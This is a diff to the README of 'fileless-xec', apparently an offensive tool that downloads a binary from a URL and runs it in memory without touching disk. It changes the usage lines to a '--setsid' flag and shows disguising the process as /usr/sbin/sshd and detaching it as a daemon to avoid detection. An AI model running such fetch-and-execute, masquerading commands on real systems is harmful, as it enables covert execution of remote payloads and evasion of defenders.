@@ -19,7 +19,7 @@
 
  - simple usage `fileless-xec [binary_url]` (~`curl | sh` for binaries)
  - execute binary with specified program name: `fileless-xec -n /usr/sbin/sshd [binary_url]`
- - detach program execution from `tty`: ` setsid fileless-xec [...]` 
+ - detach program execution from `tty`: ` fileless-xec --setsid [...]` 
 
 ![demo](https://github.com/ariary/fileless-xec/blob/main/img/fileless-xec.gif)
 
@@ -89,7 +89,7 @@ Although not present on the memory disk, the running program can still be detect
 
  2. Detach from tty to map behaviour of deamon process
  
-`setsid fileless-xec <binary_raw_url>`. *WIP call `setsid` from code*
+`fileless-xec --setsid <binary_raw_url>`.
 
 ### Caveats
 You could still be detected with:
